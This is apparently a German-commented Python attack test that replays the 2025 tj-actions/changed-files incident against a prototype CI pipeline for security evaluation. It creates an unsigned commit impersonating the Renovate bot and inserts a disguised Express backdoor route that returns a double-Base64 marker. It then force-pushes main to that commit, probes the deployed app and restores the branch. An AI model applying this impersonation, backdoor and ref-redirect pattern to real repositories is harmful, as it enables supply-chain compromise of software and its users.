"""Adversarialer Test: tj-actions/changed-files (2025) — Umlenkung einer Quellreferenz an VG2.

Bildet den tj-actions-Vorfall auf den Prototyp ab: Ein Angreifer mit dem
erbeuteten Zugang eines Bot-Kontos (CAPEC-560) erstellt außerhalb der regulären
Historie einen Commit mit Schadcode. Der Commit ist nicht signiert und nennt
den Renovate-Bot als Autor. Anschließend lenkt der Angreifer die Referenz, der
die Build-Plattform folgt, auf diesen Commit um (CAPEC-445). Im Vorfall war das
der Versions-Tag der Action, im Prototyp ist es der Branch main. Die Baseline
baut den Stand hinter der Referenz, ohne zu prüfen, ob er freigegeben ist (A2).

Payload: vereinfachter Marker statt Abfluss echter Secrets. Wie im Vorfall wird
die Ausgabe zweifach Base64-kodiert.
"""

import base64
import uuid

import lib

# Autor wie im Vorfall: der Renovate-Bot, ohne Signatur
BOT = ("renovate[bot]", "29139614+renovate[bot]@users.noreply.github.com")
COMMIT_MSG = "chore(deps): lock file maintenance"
TRIGGER = "/.well-known/renovate"

_ANCHOR = "const port = process.env.PORT || 3000;"
_MIDDLEWARE = """
// Renovate: Status der Abhängigkeitspflege
app.use((req, res, next) => {
  if (req.path === '""" + TRIGGER + """') {
    const out = 'BACKDOOR-POC:' + (req.query.n || '');
    return res.status(200).send(Buffer.from(Buffer.from(out).toString('base64')).toString('base64'));
  }
  next();
});
"""


def _backdoored(clean_src: str) -> str:
    if _ANCHOR not in clean_src:
        raise RuntimeError("Anker-Zeile in server.js nicht gefunden")
    return clean_src.replace(_ANCHOR, _ANCHOR + "\n" + _MIDDLEWARE, 1)


class TjActionsRefRedirect(lib.AttackTest):
    META = {
        "id": "tjactions-ref-redirect",
        "title": "tj-actions/changed-files — Umlenkung einer Quellreferenz",
        "vg": "VG2 (VCS -> Build-Plattform)",
        "capec": "CAPEC-560, CAPEC-445",
        "stride": "Tampering",
        "assumption": "A2",
        "incident": "tj-actions/changed-files, 2025",
    }

    def attack(self) -> None:
        self.clone()
        self._before_sha = self.head_sha()  # Ziel der Referenz vor dem Angriff, für den Cleanup
        if TRIGGER in self.read("server.js"):
            raise RuntimeError("Schadcode bereits in main, sauberen Stand zuerst wiederherstellen")
        # Commit außerhalb der regulären Historie: lokal erstellt, nie reviewt
        self.write("server.js", _backdoored(self.read("server.js")))
        self.commit(COMMIT_MSG, author=BOT)
        self._attack_sha = self.head_sha()
        print(f"    -> Commit {self._attack_sha[:10]} als '{BOT[0]}' erstellt (unsigniert)")
        # Umlenkung der Referenz mit dem erbeuteten Zugang (Force-Push)
        try:
            self.reset_remote(self._attack_sha)
        except lib.CommandError as exc:
            raise lib.AttackBlocked(f"Umlenkung von {self.cfg['branch']} abgelehnt: {lib.remote_reason(exc)}") from exc
        print(f"    -> {self.cfg['branch']} auf {self._attack_sha[:10]} umgelenkt")
        self.run_chain()

    def probe(self) -> bool:
        nonce = uuid.uuid4().hex[:12]
        with self.deployed() as url:
            _, normal_body = lib.http_get(url + "/")
            status, body = lib.http_get(f"{url}{TRIGGER}?n={nonce}")
        try:
            decoded = base64.b64decode(base64.b64decode(body)).decode()
        except Exception:  # noqa: BLE001 - kein gültiges Base64: Schadcode nicht aktiv
            decoded = ""
        reachable = status == 200 and decoded == "BACKDOOR-POC:" + nonce
        camouflage = '"message":"demo-app"' in normal_body
        if reachable:
            self.detail = (
                f"Schadcode erreichbar ({TRIGGER}, zweifach Base64), Marker bestätigt; "
                f"Tarnung {'intakt' if camouflage else 'GEBROCHEN'}; "
                f"{self.cfg['branch']} -> {self._attack_sha[:10]} als {BOT[0]}"
            )
        else:
            self.detail = "Schadcode nicht erreichbar (Marker fehlt)"
        return reachable

    def cleanup(self) -> None:
        before = getattr(self, "_before_sha", None)
        if not before or self.remote_sha() == before:
            return  # Referenz nie umgelenkt, nichts zurückzunehmen
        self.reset_remote(before)
        self.rebuild()
        print(f"    -> {self.cfg['branch']} auf {before[:10]} zurückgesetzt, Kette neu gebaut")
